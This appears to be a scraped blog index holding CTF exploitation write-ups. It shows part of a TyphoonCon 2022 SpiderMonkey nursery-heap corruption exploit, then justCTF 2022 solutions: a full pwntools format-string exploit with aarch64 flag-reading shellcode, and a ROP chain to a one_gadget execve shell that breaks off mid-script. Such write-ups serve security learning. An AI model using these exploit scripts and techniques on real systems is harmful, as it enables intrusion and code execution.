mallocedBuffers.rekeyAs(oldBuffer, newBuffer, newBuffer)); } mallocedBufferBytes -= oldBytes; mallocedBufferBytes += newBytes; } return newBuffer; } void* newBuffer = allocateBuffer(zone, newBytes); // The nursery cannot make use of the returned slots data. if (newBytes \u003c oldBytes) { position_ -= oldBytes; return oldBuffer; } if (newBuffer) { PodCopy((uint8_t*)newBuffer, (uint8_t*)oldBuffer, oldBytes); } return newBuffer; } Because I didn’t have context at all, let’s try to read the allocateBuffer method first to gain some context. void* js::Nursery::allocateBuffer(Zone* zone, size_t nbytes) { MOZ_ASSERT(nbytes \u003e 0); if (nbytes \u003c= MaxNurseryBufferSize) { void* buffer = allocate(nbytes); if (buffer) { return buffer; } } void* buffer = zone-\u003epod_malloc\u003cuint8_t\u003e(nbytes); if (buffer \u0026\u0026 !registerMallocedBuffer(buffer, nbytes)) { js_free(buffer); return nullptr; } return buffer; } Assuming that our allocated size is less than MaxNurseryBufferSize, that means allocateBuffer will call allocate method. Let’s check it out. inline void* js::Nursery::allocate(size_t size) { MOZ_ASSERT(isEnabled()); MOZ_ASSERT(!JS::RuntimeHeapIsBusy()); MOZ_ASSERT(CurrentThreadCanAccessRuntime(runtime())); MOZ_ASSERT_IF(currentChunk_ == currentStartChunk_, position() \u003e= currentStartPosition_); MOZ_ASSERT(position() % CellAlignBytes == 0); MOZ_ASSERT(size % CellAlignBytes == 0); #ifdef JS_GC_ZEAL if (gc-\u003ehasZealMode(ZealMode::CheckNursery)) { size += sizeof(Canary); } #endif if (MOZ_UNLIKELY(currentEnd() \u003c position() + size)) { return moveToNextChunkAndAllocate(size); } void* thing = (void*)position(); position_ = position() + ","date":"Jun 25, 2022","objectID":"/posts/typhooncon-ctf-2022/:1:1","tags":["Writeup","TyphoonCon","pwn","heap","firefox","SpiderMonkey","JIT","browser","oob","2022"],"title":"TyphoonCon CTF 2022","uri":"/posts/typhooncon-ctf-2022/"},{"categories":null,"content":"Exploitation Plan Now we know the bug, we need to know three things before we can actually exploit the bug: How to trigger allocateBuffer in Nursery What is the chunk metadata contents stored How to trigger reallocateBuffer in Nursery Understanding the SpiderMonkey engine Reading through this article will help us to answer the first and third question. To trigger it, we actually can just create a new array object. For example: a = new Array(0x7e) The above LOC will call allocateBuffer in the process. To understand it better, let’s fire up our gdb. Below is the script that I used to set the breakpoint. b *js::Nursery::allocate+128 b *js::Nursery::reallocateBuffer(JS::Zone*, js::gc::Cell*, void*, unsigned long, unsigned long)+643 The first breakpoint is pointing to the LOC position_ = position() + size; inside allocate The second is pointing to the LOC position_ -= oldBytes inside reallocateBuffer Now, try to initialize array like above, and lookup at the gdb. As you can see in the trace, it is true that creating an array array will call js::Nursery::allocate. The chunk address is the $rax value that you see in the above picture. Stepping through the gdb, turn out during constructing an array with size 0x7e, it will allocate 3 times with respective size 0x30, 0x400, and 0x20 (To understand why the allocation is like that, I recommend you to read this article which explain about it). Notes that these allocations size will varies based on your array size, which is why instead of calculating precisely, I’ll just focus inspecting on the gdb layout. Let’s try to assign some value to our array. a[0]=0x1337 a[1]=2.4303e-320 // Double representation of 0x1337 hex a.x = 0xbeef a.y = 0x4141 Now, let’s inspect the chunk content now (start from the first one). gef➤ x/50gx 0x1010a1c00690 0x1010a1c00690: 0x00007ffff694e3f0 0x000010b870d60fe0 0x1010a1c006a0: 0x00001010a1c009d0 0x00001010a1c006d0 0x1010a1c006b0: 0x0000000000000000 0x0000007e00000000 0x1010a1c006c0: 0x0000000200000000 0x0000007e00000005 0x1010a1c006d0: 0xfff8800000001337 0x0000000000001337 0x1010a1c006e0: 0x0000000000000000 0x0000000000000000 0x1010a1c006f0: 0x0000000000000000 0x0000000000000000 0x1010a1c00700: 0x0000000000000000 0x0000000000000000 0x1010a1c00710: 0x0000000000000000 0x0000000000000000 0x1010a1c00720: 0x0000000000000000 0x0000000000000000 0x1010a1c00730: 0x0000000000000000 0x0000000000000000 0x1010a1c00740: 0x0000000000000000 0x0000000000000000 0x1010a1c00750: 0x0000000000000000 0x0000000000000000 0x1010a1c00760: 0x0000000000000000 0x0000000000000000 0x1010a1c00770: 0x0000000000000000 0x0000000000000000 0x1010a1c00780: 0x0000000000000000 0x0000000000000000 0x1010a1c00790: 0x0000000000000000 0x0000000000000000 0x1010a1c007a0: 0x0000000000000000 0x0000000000000000 0x1010a1c007b0: 0x0000000000000000 0x0000000000000000 0x1010a1c007c0: 0x0000000000000000 0x0000000000000000 0x1010a1c007d0: 0x0000000000000000 0x0000000000000000 0x1010a1c007e0: 0x0000000000000000 0x0000000000000000 0x1010a1c007f0: 0x0000000000000000 0x0000000000000000 0x1010a1c00800: 0x0000000000000000 0x0000000000000000 0x1010a1c00810: 0x0000000000000000 0x0000000000000000 gef➤ x/20gx 0x00001010a1c009d0 0x1010a1c009d0: 0xfff880000000beef 0xfff8800000004141 0x1010a1c009e0: 0x0000000000000000 0x00007ffff694e3f2 0x1010a1c009f0: 0x0000000541410a50 0x0000003530373631 0x1010a1c00a00: 0x0000000000000000 0x00007ffff694e3f2 0x1010a1c00a10: 0x0000000413370a50 0x0000000039313934 0x1010a1c00a20: 0x0000000000000000 0x00007ffff694e3f2 0x1010a1c00a30: 0x0000000b00000250 0x2d65333033342e32 0x1010a1c00a40: 0x0000000000303233 0x0000000000000000 0x1010a1c00a50: 0x0000000000000000 0x0000000000000000 0x1010a1c00a60: 0x0000000000000000 0x0000000000000000 Some notable metadata that we can see: At address 0x1010a1c006a0, we can see that it stored a pointer to the start of our properties. At address 0x1010a1c006a8, we can see that it stored a pointer to the start of our array elements. At address 0x1010a1c006c0, it store the co","date":"Jun 25, 2022","objectID":"/posts/typhooncon-ctf-2022/:1:2","tags":["Writeup","TyphoonCon","pwn","heap","firefox","SpiderMonkey","JIT","browser","oob","2022"],"title":"TyphoonCon CTF 2022","uri":"/posts/typhooncon-ctf-2022/"},{"categories":null,"content":"Solution Below is the detailed step by step on how I craft my solution based on the final plan that I described before. Trigger Overlapping chunk Let’s restart our previous shell, and load this code: /* Sequence of operations to corrupt the Nursery Heap */ // NOTES: // - The size that I choose is based on trial-and-error inspecting the GDB // - Funny, but adding multiple line of comments also affect the nursery heap chunk layout. So I use inline comment to make sure my payload is working lol. a = new Array(0x7e) // This will initialize a-chunk inside the Nursery Heap. position_ (Nursery heap pointer to the first unallocated chunk) is still correct b = new Array(0x50) // This will add a new chunk (b-chunk) after the a-chunk position_ is still correct a.length = 0 // This will trigger reallocateBuffer (which is the bug). After this, the position_ is corrupted, where it is now pointing to around the middle of a-chunk b.fill(0) // Fill b to increase the array b total element count, so that later we can write a value to any of b array elements. c = new Array(0x50) // This will add a new chunk (c-chunk), which overlap a-chunk \u0026 b-chunk. position_ will point to around b-chunk c.length = 0x10 // This will trigger reallocateBuffer (which is the bug). After this, the position_ is corrupted, where it is now pointing to around the middle of b-chunk, specifically in the area of b-chunk array elements. d = new Array(0x20) // This will add a new chunk (d-chunk), which overlap b-chunk. Now, this d array metadata is actually overlapping with the b array elements. Hence, with b, we can overwrite the metadata stored for array d. d.fill(0) // Fill d to increase the array d total element count. // Assign 3 properties to d. This will be used during crafting addrof method d.x = 2.4303e-320; d.y = 2.4303e-320; d.z = 2.4303e-320; Based on trial and error and inspecting the gdb, the above payload will trigger the overlapping chunk bug, where with b, we can overwrite the d metadata that stored pointers to its properties and elements address. You can read the code comments for summary on why it create an overlapping chunks. So, inspecting via gdb, below is the current heap layout gef➤ x/50gx 0x1f4107200ae0 0x1f4107200ae0: 0x00007ffff6951ff0 0x00003afd8a760f40 0x1f4107200af0: 0x000055555700b9a8 0x00001f4107200b20 0x1f4107200b00: 0x0000000000000000 0x0000005000000000 0x1f4107200b10: 0x0000005000000000 0x0000005000000050 0x1f4107200b20: 0xfff8800000000000 0xfff8800000000000 0x1f4107200b30: 0xfff8800000000000 0xfff8800000000000 0x1f4107200b40: 0xfff8800000000000 0xfff8800000000000 0x1f4107200b50: 0xfff8800000000000 0xfff8800000000000 0x1f4107200b60: 0xfff8800000000000 0x0000000e00000000 0x1f4107200b70: 0x0000000e0000000e 0xfffb3afd8a761560 0x1f4107200b80: 0xfffb3afd8a761560 0xfffb3afd8a761560 0x1f4107200b90: 0xfffb3afd8a761560 0xfffb3afd8a761560 0x1f4107200ba0: 0xfffb3afd8a761560 0xfffb3afd8a761560 0x1f4107200bb0: 0xfffb3afd8a761560 0xfffb3afd8a761560 0x1f4107200bc0: 0xfffb3afd8a761560 0xfffb3afd8a761560 0x1f4107200bd0: 0xfffb3afd8a761560 0xfffb3afd8a761560 0x1f4107200be0: 0xfffb3afd8a761560 0x00007ffff6951ff0 0x1f4107200bf0: 0x00003afd8a765140 0x00001f4107200da0 0x1f4107200c00: 0x00001f4107200c28 0x0000000000000000 0x1f4107200c10: 0x0000002000000000 0x0000002000000000 0x1f4107200c20: 0x0000002000000020 0xfff8800000000000 0x1f4107200c30: 0xfff8800000000000 0xfff8800000000000 0x1f4107200c40: 0xfff8800000000000 0xfff8800000000000 0x1f4107200c50: 0xfff8800000000000 0xfff8800000000000 0x1f4107200c60: 0xfff8800000000000 0xfff8800000000000 gef➤ x/10gx 0x00001f4107200da0 0x1f4107200da0: 0x0000000000001337 0x0000000000001337 0x1f4107200db0: 0x0000000000001337 0x00007ffff6951ff2 0x1f4107200dc0: 0x0000000c00000250 0x3032373031346631 0x1f4107200dd0: 0x0000000038656130 0x00007ffff6951ff2 0x1f4107200de0: 0x0000000e00000250 0x3237303134663122 Notes: 0x1f4107200b20 is the starting of array B elements. 0x1f4107200bf8 is used by array D to store pointer to its properties (on","date":"Jun 25, 2022","objectID":"/posts/typhooncon-ctf-2022/:1:3","tags":["Writeup","TyphoonCon","pwn","heap","firefox","SpiderMonkey","JIT","browser","oob","2022"],"title":"TyphoonCon CTF 2022","uri":"/posts/typhooncon-ctf-2022/"},{"categories":null,"content":" During the weekend, I played this CTF together with my new team idek. We managed to secure 8th spot. Kudos to my team and the organizers for such a high quality CTF challenges. On this post, I’ll explain my solution to the pwn challenges that I managed to solve during the CTF. Pwn ","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:0:0","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":"arm This IoT solution will revolutionize the market! nc arm.nc.jctf.pro 5002 PS: there is a few minutes timeout for every connection. ","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:1:0","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a Dockerfile and a binary file called cli. Let’s check the given binary first Arch: aarch64-64-little RELRO: Full RELRO Stack: No canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments Oh wow, Full RELRO. We can’t overwrite GOT table. NX disabled. Stack is executable. PIE enabled. That means we will need a leak. It’s an aarch64 file. My laptop use amd architecture, so I won’t be able to run the file directly. Let’s forget it for a while, and just disassemble the given binary first. main undefined8 main(void) { int iVar1; setvbuf(stdin,(char *)0x0,2,0); iVar1 = setvbuf(stdout,(char *)0x0,2,0); iVar1 = auth(iVar1); if (iVar1 == 0) { puts(\"Sorry.\"); } else { cli(); } return 0; } So this is the main method, it will call auth, and if we are authenticated, it will call cli. Let’s check auth function. auth undefined8 auth(void) { undefined *puVar1; int iVar2; size_t sVar3; char acStack32 [16]; char acStack16 [16]; puts(\"Turrbomower 65000FU\\n\"); printf(\"login: \"); read_bytes(acStack16,0xf); printf(\"password: \"); read_bytes(acStack32,0xf); puVar1 = user; sVar3 = strlen(user); iVar2 = strncmp(acStack16,puVar1,sVar3); puVar1 = pass; if (iVar2 == 0) { sVar3 = strlen(pass); iVar2 = strncmp(acStack32,puVar1,sVar3); if (iVar2 == 0) { return 1; } } return 0; } Oh well, the user and pass is stored lol. We can simply bypass this auth. Let’s move to the cli method then. cli void cli(void) { int iVar1; size_t __n; char cmd [5]; char acStack355 [251]; char echo_input [100]; int local_4; local_4 = 0; while( true ) { printf(\"\u003e \"); read_bytes(cmd,0x100); iVar1 = strncmp(cmd,\"exit\",4); if (iVar1 == 0) break; iVar1 = strncmp(cmd,\"echo\",4); if ((iVar1 == 0) \u0026\u0026 (local_4 == 1)) { __n = strlen(cmd); strncpy(echo_input,acStack355,__n); printf(echo_input); } else { iVar1 = strncmp(cmd,\"status\",6); if (iVar1 == 0) { system(\"uptime\"); } else { iVar1 = strncmp(cmd,\"mode\",4); if (iVar1 == 0) { iVar1 = strncmp(acStack355,\"advanced\",8); if (iVar1 == 0) { local_4 = 1; puts(\"advanced mode enabled\\n\"); } else { puts(\"unknown mode\"); } } else if (local_4 == 0) { puts(\"status - prints device status\\nexit - end cli session\"); } else { puts( \"status - prints device status\\necho \u003cstring\u003e - prints \u003cstring\u003e\\nexit - end cli sessio n\" ); } } } memset(cmd,0,0x100); } return; } Ah okay, we can notice that there is format string vuln in the echo feature. Also notes that to be able to use echo feature, we need to activated advanced mode first, which is simply send command mode advanced to the server, and no we are able to use the echo feature. Also another thing is it has its own read function called read_bytes. Let’s take a look on it. void read_bytes(char *param_1,int param_2) { char *local_18; int local_4; local_4 = 0; for (local_18 = param_1; (((local_4 != param_2 \u0026\u0026 (read(0,local_18,1), *local_18 != '\\n')) \u0026\u0026 (*local_18 != '\\0')) \u0026\u0026 (((*local_18 != '\\x1b' \u0026\u0026 (*local_18 != '\\xa8')) \u0026\u0026 (*local_18 != '\\x13')))); local_18 = local_18 + 1) { local_4 = local_4 + 1; } return; } Ah, so basically it will read our input one-by-one per char, and if it is one of the fourth terminating character, it’ll stop reading our input. As we already understand how the binary works, now, let’s check the dockerfile # on host: docker run --rm --privileged multiarch/qemu-user-static --reset -p yes FROM arm64v8/ubuntu ENV DEBIAN_FRONTEND=noninteractive #RUN apt update \u0026\u0026 apt install gcc gdb git -yy #RUN git clone https://github.com/pwndbg/pwndbg \u0026\u0026 cd pwndbg \u0026\u0026 ./setup.sh #RUN pip3 install pwn RUN apt update \u0026\u0026 apt install socat gcc -yy RUN mkdir /pwn COPY cli /pwn/cli #COPY cli.c /pwn/cli.c #RUN gcc -D_FORTIFY_SOURCE=2 -fno-stack-protector -zexecstack -o /pwn/cli /pwn/cli.c \u0026\u0026 rm /pwn/cli.c COPY flag.txt /pwn/flag.txt COPY run.sh /pwn/run.sh RUN groupadd ctf \u0026\u0026 \\ useradd -G ctf --home=/pwn pwn # Helper/fixer for socat issues COPY socat-sigpipe-fixup /pwn/socat-sigpipe-fixup RUN chmod 111 /pwn/socat-sigpipe-fixup \u0026\u0026 \\ chmod 700 /pwn/run.sh CMD \"/pwn/run.sh\" Ok","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:1:1","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":"Exploitation Plan Well, because NX is disabled, my final goal will be using the format string bug to put shellcode in the stack, and then pivot the stack so that it’ll return to my shellcode. However, this is an arm binary, which is this is my first time seeing an arm binary. So, what I do is learning some basic arm instruction and general concept on how does it run. Basic info about arm64 binary Reading through the previous mentioned articles and this article from perfect blue team helps me a lot on understanding how an arm64 instructions works. First, let’s talk about the available registers. It has 31 main registers, ranging from x0 to x30. x29 is used to store the function frame pointer, while x30 is used to store the function return address. Because we want to abuse format string vuln, we need to learn also on how arm64 handled function arguments. The answer is it will use x0 - x7 as its args first, and will use the stack for the remaining args. Last, one of the unique thing that we need to know is, in arm64, when we call a function (via bl instruction), it will store the return address in x30 first. And then, the called function will preserve these values on top of the stack ([sp] and [sp+8]). So, this is difference with what x86_64 do, where it preserves those values on the bottom of the stack. See below example to see the usual setup of arm64 function. 00100bd0 fd 7b a7 a9 stp x29,x30,[sp, #-400]! 00100bd4 fd 03 00 91 mov x29,sp In the start of the function, it will subtract the current sp by 400, and then preserve the caller frame pointer (x29) and the return address (x30) to the top of the function stack. And then it will store the the new sp value in x29. Let see how ret does in arm64 0x4000000d50 \u003ccli+384\u003e ldp x29, x30, [sp], #400 0x4000000d54 \u003ccli+388\u003e ret It will restore the preserved frame pointer and return address from the stack back to x29 and x30, and then update sp value back to the caller function stack (sp-400). And then ret won’t pop a stack like x86_64, instead, it will jump to the value in x30 register. Rough Plan What we have gathered so far: The frame pointer and saved return address is stored in the top of the stack (which means we can access it with the format string bug) We can do the format string attack infinite times, as there is no limitation NX is disabled, so we can store shellcode in the stack Now it is clear, that my detailed plan: Leak main frame pointer with echo %8$p. We use 8 to get the top of the stack because in arm64, 1st - 7th param will be taken from the register (x1 - x7). After leaking it, set our target shellcode location. I choose to put it in the leaked_value - 0x3f0 And then, we put the shellcode per byte with format string bug. Rough payload will be echo %{shellcode_bytecode}c%16$hhn{padding}{shellcode_address}. The detailed can be found later And then, for the final step, we overwrite the preserved return address ([sp+8]) with the shellcode_address, so that when we exit from the cli function, it will jump to our shellcode inside the stack. ","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:1:2","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":"Solution So, based on that plan, we need to craft our shellcode first. Notes that there are some restricted char, so make sure that our shellcode doesn’t contain the restricted char. Based on trial and error, we can’t use execve syscall because it contains \\x1b. One of my teammate suggest me to directly open-read-write the flag (kudos to Ka3l). Looking for the existing shellcode in google, I found a good shellcode, and modify it a little bit. And the shellcode doesn’t contain any restricted characters, so it should be fine. Below is the full script that I used to solve the problem: from pwn import * context.arch = 'aarch64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") # source: https://www.exploit-db.com/exploits/47053 shellcode = asm( \"\"\" // open \"/pwn/flag.txt\" mov x0, xzr mov x1, #0x2e67 movk x1, #0x7874, lsl #16 movk x1, #0x74, lsl #32 str x1, [sp, #-8]! mov x1, #0x702f movk x1, #0x6e77, lsl #16 movk x1, #0x662f, lsl #32 movk x1, #0x616c, lsl #48 str x1, [sp, #-8]! add x1, sp, x0 mov x2, xzr mov x8, #56 svc #0x1337 mvn x3, x0 // read(fd, *buf, size) mov x2, #0xfff sub sp, sp, x2 mov x8, xzr add x1, sp, x8 mov x8, #63 svc #0x1337 // write(1, *buf, size) str x0, [sp, #-8]! lsr x0, x2, #11 ldr x2, [sp], #8 mov x8, #64 svc #0x1337 \"\"\" ) def conn(): if args.LOCAL: r = process(['qemu-aarch64', './cli_patched'], env={}) if args.PLT_DEBUG: r = process(['qemu-aarch64','-g', '9000', './cli_patched'], env={}) else: r = remote('arm.nc.jctf.pro', 5002) return r r = conn() # Login (credential retrieved from the binary in .data section) r.sendlineafter(b'login: ', b'admin') r.sendlineafter(b'password: ', b'admin1') # Activate mode advanced, so that we can use echo r.sendlineafter(b'\u003e ', b'mode advanced') # Leak main frame pointer r.sendlineafter(b'\u003e ', b'echo %8$p') main_x29 = int(r.recvline().strip(), 16) # Set any stack address to put our shellcode shellcode_stack_addr = main_x29 - 0x3f0 log.info(f'Shellcode stack address: {hex(shellcode_stack_addr)}') # Put it in stack per byte for i in range(0, len(shellcode)): value = shellcode[i] target = p64(shellcode_stack_addr+i) if value == 0: f'echo %15$hhnaaaa'.encode()+target else: payload = f'echo %{value}c%16$hhn'.encode() payload += b'a'*(24-len(payload)) # pad so that payload is 8-bytes aligned payload += target # Make sure that payload is bypassing the restriction if b'\\n' in payload or b'\\x1b' in payload or b'\\x13' in payload or b'\\xa8' in payload: log.info(f'Invalid payload') exit() log.info('-----') log.info(f'Payload: {payload}') r.sendlineafter(b'\u003e ', payload) log.info(f'Finished setting up shellcode...') # The preserved saved return pointer x30_ret_addr = main_x29-400+8 log.info(f'Main x30 (Return address): {hex(x30_ret_addr)}') # I don't know why, but somehow I can't overwrite x30_ret_addr+0 directly # So, during sending my exploit in remote, I overwrite the preserved saved return # address to our shellcode in stack with this order: # - x30_ret_addr+1: Overwrite 1 byte # - x30_ret_addr+2: Overwrite 1 byte # - x30_ret_addr+3: Overwrite 1 byte # - x30_ret_addr+4: Overwrite 1 byte # - x30_ret_addr-1: Overwrite 2 byte, so that x30_ret_addr+0 will be overwritten for i, byt in enumerate(p64(shellcode_stack_addr)[:5]): if i == 0: continue print('i', i, hex(byt)) payload = f'echo %{byt}c%16$hhn'.encode() payload += b'a'*(24 - len(payload)) payload += p64(x30_ret_addr+i) log.info(f'Payload: {payload}') r.sendlineafter(b'\u003e ', payload) payload = f'echo %{p64(shellcode_stack_addr)[0] \u003c\u003c 8}c%16$hn'.encode() payload += b'a'*(24 - len(payload)) payload += p64(x30_ret_addr-1) print(f'Payload: {payload}', len(payload)) r.sendlineafter(b'\u003e ', payload) # Now, exit from cli function. And then it will return to our shellcode r.sendlineafter(b'\u003e ', b'exit') r.interactive() Result Flag: justCTF{pwn_the_lawn!1} ","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:1:3","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":"Skilltest Test your skills in a random competition. nc skilltest.nc.jctf.pro 1337 ","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:2:0","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":"Initial Analysis We were given a binary file. Let’s try to checksec it first Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3fe000) RUNPATH: b'.' Okay, No PIE and Full RELRO. Now, let’s try to disassemble it (Notes that I’ve renamed some of the function to understand it better). main undefined8 main(void) { undefined rand_struct [48]; setup_mprotect(); print_custom(\"Welcome to skilltest v12!\\n\"); memset(rand_struct,0,0x30); rand_func((astruct *)rand_struct); main_loop((astruct_1 *)(rand_struct + 0x18)); check_win((astruct_2 *)rand_struct); unsetup_mprotect(); return 0; } This is the main function, seems like no vuln in here. print_custom void print_custom(char *param_1) { size_t __n; __n = strlen(param_1); write(1,param_1,__n); return; } This will print given string. rand_func void rand_func(astruct *a_struct) { int iVar1; int iVar2; time_t tVar3; size_t sVar4; ulong idx; ulong jdx; tVar3 = time((time_t *)0x0); srand((uint)tVar3); iVar1 = rand(); iVar2 = rand(); a_struct-\u003efield0_0x0 = \"Amelie\" + (long)(iVar1 % 10) * 0x20; a_struct-\u003efield1_0x8 = \"Black\" + (long)(iVar2 % 5) * 0x60; a_struct-\u003efield2_0x10 = 0; jdx = 0; while( true ) { sVar4 = strlen(a_struct-\u003efield0_0x0); if (sVar4 \u003c= jdx) break; a_struct-\u003efield2_0x10 = a_struct-\u003efield2_0x10 + (int)a_struct-\u003efield0_0x0[jdx]; a_struct-\u003efield2_0x10 = a_struct-\u003efield2_0x10 % 0x1e; jdx = jdx + 1; } idx = 0; while( true ) { sVar4 = strlen(a_struct-\u003efield1_0x8); if (sVar4 \u003c= idx) break; a_struct-\u003efield2_0x10 = a_struct-\u003efield2_0x10 + (int)a_struct-\u003efield1_0x8[idx]; a_struct-\u003efield2_0x10 = a_struct-\u003efield2_0x10 % 0x1e; idx = idx + 1; } return; } So far, there isn’t any bug in here. main_loop void main_loop(astruct_1 *input_struct) { ssize_t sVar1; char *_res; size_t sVar2; char *nickname; void *clan_tag; ulong jdx; ulong idx; clan_tag = malloc(size_0x60); memset(\u0026nickname,0,size_0x20); memset(clan_tag,0,size_0x60); while( true ) { while( true ) { print_custom(\"Nick: \"); sVar1 = read(0,\u0026nickname,size_0x60); if (0 \u003c sVar1) break; print_custom(\"Invalid name, try again\\n\"); } print_custom(\"Clan tag: \"); sVar1 = read(0,clan_tag,size_0x60); if (0 \u003c sVar1) break; print_custom(\"Invalid color, try again\\n\"); } _res = (char *)FUN_00401389(\u0026nickname); _res = strdup(_res); input_struct-\u003enick_name = _res; _res = (char *)FUN_00401389(clan_tag); input_struct-\u003eclan_tag = _res; input_struct-\u003escore = 0; idx = 0; while (sVar2 = strlen(input_struct-\u003enick_name), idx \u003c sVar2) { input_struct-\u003escore = input_struct-\u003escore + (int)input_struct-\u003enick_name[idx]; input_struct-\u003escore = input_struct-\u003escore % 0x1e; idx = idx + 1; } jdx = 0; while (sVar2 = strlen(input_struct-\u003eclan_tag), jdx \u003c sVar2) { input_struct-\u003escore = input_struct-\u003escore + (int)input_struct-\u003eclan_tag[jdx]; input_struct-\u003escore = input_struct-\u003escore % 0x1e; jdx = jdx + 1; } print_custom(\"Thanks\\n\"); return; } At first, I didn’t notice a bug in here. But one of my teammate (kudos to pivik, also pivik is the one who solve this chall and submit the flag first xD. But I decided to finish my solver script for the sake of learning and experience) said that there is a buffer overflow bug during inputting our nickname. I just realized that the nickname size is 0x20, but we can input up to 0x60. This will allow us to: Overwrite the clan_tag pointer Overwrite the function rbp Overwrite the function return address I checked the other function, and seems like there isn’t any bug. And I think this buffer overflow bug is enough for us to perform our exploitation. ","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:2:1","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":"Exploitation Plan Using the above bug that we found, checking the memory mapping during running the binary, we can see that there is a static writeable region in offset 0x3fe000 - 0x400000. gef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x000000003fe000 0x00000000400000 0x00000000000000 rw- So, based on that, my rough plan is: Pivot the stack to that region Overwrite the return address to its ownself, so that I can fill the new stack with my desired input Fill stack with my desired input, so that I can ROP it to leak libc, and then go back to the main_loop And after leaking libc, ROP to execve that we found with one_gadget. Notes that the one_gadget address that I used required r12 and r15 to be null, so I emptied it first with gadget that I found in the given libc. ","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:2:2","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 2022","uri":"/posts/justctf-2022/"},{"categories":null,"content":"Solution Notes that during executing my plan, there are a lot of constraint and ad-hoc things that I need to do. I’ve tried to add comments to my script to explain how did I pivot and ROP it, so that I can get a shell. You can read the comments in my script Below is the full script: from pwn import * context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") exe = ELF(\"./skilltest_patched\") libc = ELF(\"./libc-2.34.so\") context.binary = exe r = remote(b'skilltest.nc.jctf.pro', 1337) # r = process([exe.path]) # gdb.attach(r, gdbscript=''' # b *0x00000000004014a0 # b *0x00000000004014e0 # b *0x00401643 # ''') '''Preparation''' write_got = exe.got['write'] # We will leak the write libc address later pop_rdi = 0x00000000004018dc # pop rdi ; nop ; leave ; ret main_loop = 0x40147b # Main loop address (directly to instruction that ask \"Nick: \" input) main_loop_sub_rsp = 0x40142a # Main loop address (directly to instruction sub rsp, 0x50) write_custom = 0x004013ef # Write method defined in the binary (print_custom) w_addr = 0x3fe800 # Static writeable region found via vmmap. I decided to use this address, but I believe you can choose any address. ''' Constraint that we need to fulfill during each ROP to the main loop: - Everytime we loop to the main and pivot our rbp, rbp-0x48 must be in writeable region, because it will be used to store the strdup result ''' '''First Loop''' # The goal for this is to pivot RBP for our next main loop call to the static writeable region (w_addr) second_rbp = w_addr payload = b'a'*0x28 # Overwrite clan_tag address to second_rbp-0x48, so that we can ensure # second_rbp-0x48 is in writeable region for our next main loop # (By filling the clan_tag with the writeable address) payload += p64(second_rbp-0x48) payload += b'a'*0x10 payload += p64(second_rbp) # Overwrite rbp to second_rbp payload += p64(main_loop) # Overwrite saved return address, so that it return to main loop again r.sendlineafter(b\"Nick: \", payload) r.sendlineafter(b\"Clan tag: \", p64(w_addr-0x300)) # Fill rbp-0x48 (which is now our clan_tag) to a writeable region '''Second Loop''' # Now, our goal is to leak libc address of write. The plan # - Overwrite clan_tag address to writeable region # - Pivot RBP to the new clan_tag address # - Fill clan_tag with our desired ROP, as we will ROP it to clan_tag later intermediate_rbp = w_addr-0x60 # Can be any address payload = b'a'*0x28 payload += p64(intermediate_rbp) # Overwrite clan_tag address to writeable region payload += b'a'*0x10 payload += p64(intermediate_rbp) # RBP pivot to our clan tag input # Payload for our ROP (this will overwrite the second loop return address). # - Pop write_got to rdi. Because it is pop -\u003e leave -\u003e ret, after leave, # rsp will point to clan_tag+8, rbp point to clan_tag payload += p64(pop_rdi) + p64(write_got) r.sendlineafter(b\"Nick: \", payload) # Notes that after previous leave, rsp will point to here (tag_payload+8). So, we can continue our ROP in here # What this payload do: # - Set new rbp (because write_custom method will call leave-\u003eret again). # RBP can be any address # - Ret to our write custom (Now, we got libc leak) # - Return to main loop (Directly to sub rsp, 0x50 in main_loop instruction) third_rbp = w_addr-0x50 # Can be any address tag_payload = p64(w_addr-0x50) + p64(write_custom) + p64(main_loop_sub_rsp) r.sendlineafter(b\"Clan tag: \", tag_payload) # ROP is executed, and we got our leaked libc r.recvline() leaked_write = u64(r.recvn(6).ljust(8, b'\\x00')) print(f'Leaked write: {hex(leaked_write)}') libc.base = leaked_write - libc.symbols['write'] print(f'Libc base: {hex(libc.base)}') '''Third Loop''' # Now, with one_gadget, we will gain shell with constraint r12 \u0026 r15 must be null pop_r12 = libc.base + 0x0000000000035761 # pop r12; ret pop_r15 = libc.base + 0x000000000002a6c4 # pop r15; ret execve_addr = libc.base + 0xeacec # Constraints: r12 == null, r15 == null # Final payload. Our goal: # - Overwrite clan_","date":"Jun 13, 2022","objectID":"/posts/justctf-2022/:2:3","tags":["Writeup","justCTF","pwn","format string","buffer overflow","rop","aarch64","arm64","2022"],"title":"JustCTF 